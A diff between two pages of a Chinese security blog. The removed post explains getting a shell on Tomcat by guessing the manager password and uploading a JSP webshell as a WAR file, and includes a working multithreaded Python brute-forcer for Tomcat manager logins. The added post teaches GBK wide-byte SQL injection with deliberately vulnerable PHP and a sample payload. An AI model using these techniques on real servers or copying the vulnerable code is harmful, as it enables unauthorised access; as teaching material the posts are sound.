@@ -3,7 +3,7 @@
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tomcat部署War包getshell - Reber's Blog</title>
+  <title>SQL注入之宽字节注入 - Reber's Blog</title>
   <meta name="keywords" content="渗透测试 漏洞挖掘 web安全 网络安全 python php linux">
   <meta name="description" content="">
   <meta name="author" content="reber">
@@ -78,14 +78,14 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>Tomcat部署War包getshell</h2>
+                <h2>SQL注入之宽字节注入</h2>
             </div>
             <div class="content">
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
-                        <time>2016-08-02</time>
+                        <time>2016-06-24</time>
                     </div>
 
                     
@@ -106,7 +106,7 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/getshell">getshell</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                             
                         
                         
@@ -115,173 +115,71 @@
                 
                 
 
-<h3 id="0x00-关于war包:2ffd557bf22c64e9fb63b3171fee9e6c">0x00 关于War包</h3>
+<h3 id="0x00-应用场景:fbb6bfdfe53ff8325858f2be24ae74f4">0x00 应用场景</h3>
 
 <blockquote>
-<pre><code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
-以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
-则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
-服务器启动时,War包也会随之被解压后自动部署。
+<pre><code>在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&quot;\&quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
 </code></pre>
 </blockquote>
 
-<h3 id="0x01-上传war包getshell:2ffd557bf22c64e9fb63b3171fee9e6c">0x01 上传War包GetShell</h3>
-
-<ul>
-<li><p>找到后台猜密码然后登录
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcat_vul_background.png" alt="Tomcat后台">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcat_vul_login.png" alt="Tomcat后台登录">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcat_vul_war_login_success.png" alt="Tomcat后台登录成功">
-</div>
-</p></li>
-
-<li><p>上传War包<br />
-先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcot_vul_put_war.png" alt="Tomcat上传War包">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcot_vul_put_war_success.png" alt="Tomcat上传War包成功">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcot_vul_visit_shell1.png" alt="Tomcat部署War包后访问shell1">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="/img/post/tomcot_vul_visit_shell2.png" alt="Tomcat部署War包后访问shell2">
-</div>
-</p></li>
-</ul>
-
-<h3 id="0x02漏洞防御:2ffd557bf22c64e9fb63b3171fee9e6c">0x02漏洞防御</h3>
-
-<ul>
-<li>后台使用强密码</li>
-<li>删除Tomcat下的manager文件夹</li>
-</ul>
-
-<h3 id="0x03-附爆破弱口令代码:2ffd557bf22c64e9fb63b3171fee9e6c">0x03 附爆破弱口令代码</h3>
+<h3 id="0x01-测试代码:fbb6bfdfe53ff8325858f2be24ae74f4">0x01 测试代码</h3>
 
 <blockquote>
-<pre><code class="language-python">#!/usr/bin/env python
-#-*- coding:utf-8 -*-
+<pre><code>&lt;?php
+    $conn = mysql_connect('localhost','root','root');
+    mysql_select_db('messages',$conn);
 
-import requests
-import json
-import base64
-import sys
-import Queue
-import threading
+    if (isset($_GET['id'])) {
+        $id = addslashes($_GET['id']); //转义id
+        $sql = &quot;select * from msg where id='$id';&quot;;
+        echo $sql.&quot;&lt;br /&gt;&quot;;
 
-&quot;&quot;&quot;
-简单爆破后台登陆密码
-Usage: python tomcat.py username.txt password.txt urlfile.txt
-username.txt为用户名字典
-password.txt为密码字典
-urlfile.txt为后台url列表
-&quot;&quot;&quot;
-
-def get_username(userfile):
-    username = []
-    with open(userfile, 'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            username.append(line.strip())
-    return username
-
-def get_pwd(passfile):
-    password = []
-    with open(passfile, 'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            password.append(line.strip())
-    return password
-
-def get_url(urlfile):
-    urllist = Queue.Queue()
-    with open(urlfile,'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            urllist.put(line.strip())
-    return urllist
-
-def thread(f,urls,names,pwds):
-    while not urls.empty():
-        s = requests.Session()
-        url = urls.get()
-        resp = s.get(url,timeout=10)  #用于记录cookie
-        Referer = resp.url
-
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
-            'Referer': Referer,
+        $result = mysql_query($sql);
+        $rows = @mysql_fetch_assoc($result);
+        if ($rows) {
+            echo '&lt;table align=&quot;left&quot; border=&quot;1&quot;&gt;';
+            foreach ($rows as $key =&gt; $value) {
+                echo '&lt;tr align=&quot;lift&quot; height=&quot;30&quot;&gt;';
+                echo '&lt;td&gt;'.$key.'----'.$value.'&lt;/td&gt;';
+                echo '&lt;/tr&gt;';            
+            }
+            echo '&lt;/table&gt;';
+        } else {
+            echo mysql_error();
         }
-        bgurl = url + 'manager/html'
-        # print bgurl
-        for name in names:
-            for pwd in pwds:
-                authorize = name + ':' + pwd
-                Basic = &quot;Basic &quot; + base64.b64encode(authorize)
-                headers['Authorization'] = Basic
-                # print json.dumps(headers, indent=4)
-
-                proxy = {
-                    'http':'http://127.0.0.1:1080'
-                }
-
-                resp = s.get(bgurl,headers=headers,proxies=proxy,timeout=10)
-                if resp.status_code == 200:
-                    s = &quot;[Ok] %s\t%s:%s&quot; % (bgurl,name,pwd)
-                    print s
-                    f.write(s)
-                    exit()
-                else:
-                    print '[Error] ' + bgurl + '\t' + name + ':' + pwd
-            # break
-
-def main():
-    if len(sys.argv) &lt; 4:
-        print &quot;Usage: python tomcat.py username.txt password.txt urlfile.txt&quot;
-        exit()
-    userfile = sys.argv[1]
-    passfile = sys.argv[2]
-    urlfile = sys.argv[3]
-    names = get_pwd(userfile)
-    pwds = get_pwd(passfile)
-    urls = get_url(urlfile)
-
-    tlist = []
-    f = open(&quot;result.txt&quot;,&quot;a+&quot;)
-    for x in xrange(1,50):
-        t = threading.Thread(target=thread,args=(f,urls,names,pwds,))
-        tlist.append(t)
-    for t in tlist:
-        t.start()
-    t.join()
-
-main()
+    } else {
+        echo &quot;please input id.&quot;;
+    }
+?&gt;
 </code></pre>
+
+
+<div class="pure-u-1">
+  <img class="pure-img" src="/img/post/injection_of_wide_byte_addslashes.png" alt="单引号被转义">
+</div>
+
+</blockquote>
+
+<h3 id="0x02-宽字节注入原理:fbb6bfdfe53ff8325858f2be24ae74f4">0x02 宽字节注入原理</h3>
+
+<blockquote>
+<pre><code class="language-ini">当MySQL使用的是GBK编码时，0xbf5c会被当做一个字符(双字节字符)，其中5c是&quot;\&quot;
+
+当注入语句为http://127.0.0.1/test.php?id=2%bf'时
+在数据库中bf会和转义符&quot;\&quot;形成一个双字节字符&quot;縗&quot;，从而单引号逃逸
+</code></pre>
+
+<p>
+<div class="pure-u-1">
+  <img class="pure-img" src="/img/post/injection_of_wide_byte_bf.png" alt="转义符被bf吃掉">
+</div>
+
+<br /></br />
+
+<div class="pure-u-1">
+  <img class="pure-img" src="/img/post/injection_of_wide_byte_user.png" alt="单引号逃逸后查询user">
+</div>
+</p>
 </blockquote>
 
                 
@@ -298,13 +196,13 @@ main()
 <div class="prev-next-post pure-g">
   <div class="pure-u-1-24" style="text-align: left;">
     
-    <a href="http://wyb0.com/posts/cgi-and-fastcgi-and-php-fpm/"><i class="fa fa-chevron-left"></i></a>
+    <a href="http://wyb0.com/posts/injection-of-defense/"><i class="fa fa-chevron-left"></i></a>
     
   </div>
   <div class="pure-u-10-24">
     
     <nav class="prev">
-      <a href="http://wyb0.com/posts/cgi-and-fastcgi-and-php-fpm/">CGI与FastCGI与PHP-FPM</a>
+      <a href="http://wyb0.com/posts/injection-of-defense/">SQL注入之防御</a>
     </nav>
     
   </div>
@@ -314,13 +212,13 @@ main()
   <div class="pure-u-10-24">
     
     <nav class="next">
-      <a href="http://wyb0.com/posts/install-redis/">Redis的安装</a>
+      <a href="http://wyb0.com/posts/python-module-logging/">Python的logging模块</a>
     </nav>
     
   </div>
   <div class="pure-u-1-24" style="text-align: right;">
     
-    <a href="http://wyb0.com/posts/install-redis/"><i class="fa fa-chevron-right"></i></a>
+    <a href="http://wyb0.com/posts/python-module-logging/"><i class="fa fa-chevron-right"></i></a>
     
   </div>
 </div>
